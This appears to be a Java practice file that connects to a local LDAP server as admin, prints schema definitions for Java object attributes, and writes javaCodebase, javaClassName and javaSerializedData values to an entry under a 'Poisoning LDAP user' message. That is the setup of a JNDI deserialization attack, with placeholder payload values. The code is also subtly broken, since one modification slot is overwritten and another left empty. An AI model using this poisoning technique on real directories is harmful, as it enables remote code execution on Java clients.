package com.trganda.pratice;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.BasicAttribute;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import javax.naming.directory.ModificationItem;
import java.util.Locale;
import java.util.Properties;

public class Practice {
    private static String[] allAttrs = {
        "javaSerializedObject",
        "javaFactoryLocation",
        "javaReferenceAddress",
        "javaFactory",
        "javaClassName",
        "javaClassNames",
        "javaDoc",
        "javaSerializedData",
        "javaCodebase",
        "javaFactory",
        "javaReferenceAddress"
    };

    private static String[] allOCs = {
        "javaObject",
        "javaNamingReference",
        "javaSerializedObject",
        "javaRemoteObject",
        "javaMarshalledObject",
        "javaContainer"
    };

    public static void showSchema(DirContext ctx, String[] attrs, String[] ocs)
            throws NamingException {
        DirContext attrRoot =
                (DirContext)ctx.getSchema("").lookup("AttributeDefinition");
        printSchema(attrRoot, attrs);

        DirContext ocRoot =
                (DirContext)ctx.getSchema("").lookup("ClassDefinition");
        printSchema(ocRoot, ocs);
    }

    public static void printSchema(DirContext ctx, String[] ids) {
        for (int i = 0; i < ids.length; i++) {
            try {
                System.out.print(ids[i] + ": ");
                System.out.print(ctx.getAttributes(ids[i]));
            } catch (NamingException e) {
            } finally {
                System.out.println();
            }
        }
    }

    public static void main(String[] args) throws NamingException {
        Properties properties = new Properties();
        properties.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        properties.setProperty(Context.REFERRAL, "follow");
        properties.setProperty(Context.PROVIDER_URL, "ldap://localhost");

        properties.setProperty(Context.SECURITY_AUTHENTICATION, "simple");
        properties.setProperty(Context.SECURITY_PRINCIPAL, "cn=admin,dc=trganda,dc=com");
        properties.setProperty(Context.SECURITY_CREDENTIALS, "changeme");

        properties.put("com.sun.jndi.ldap.trace.ber", System.err);

        DirContext context = new InitialDirContext(properties);

        String attackerURL = "1";
        System.out.println("Poisoning LDAP user");
        BasicAttribute mod1 = new BasicAttribute("javaCodebase", attackerURL);
        BasicAttribute mod2 = new BasicAttribute("javaClassName".toLowerCase(Locale.ROOT),"DeserPayload");
        BasicAttribute mod3 = new BasicAttribute("javaSerializedData".toLowerCase(Locale.ROOT), "test");
        ModificationItem[] mods = new ModificationItem[3];
        mods[0] = new ModificationItem(DirContext.REPLACE_ATTRIBUTE, mod1);
        mods[0] = new ModificationItem(DirContext.REPLACE_ATTRIBUTE, mod2);
        mods[1] = new ModificationItem(DirContext.REPLACE_ATTRIBUTE, mod3);
        context.modifyAttributes("dc=trganda,dc=trganda,dc=com", mods);

//        showSchema(context, allAttrs, allOCs);
    }
}
